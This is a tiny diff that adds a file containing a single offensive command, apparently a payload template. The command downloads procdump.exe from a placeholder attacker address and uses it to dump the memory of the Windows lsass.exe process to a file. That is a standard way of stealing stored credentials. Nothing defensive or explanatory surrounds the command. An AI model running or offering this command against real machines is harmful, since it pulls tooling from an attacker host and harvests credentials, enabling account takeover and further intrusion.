@@ -1,0 +1,3 @@
+wget http://{ip_attacker}/procdump.exe -OutFile procdump.exe; .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+
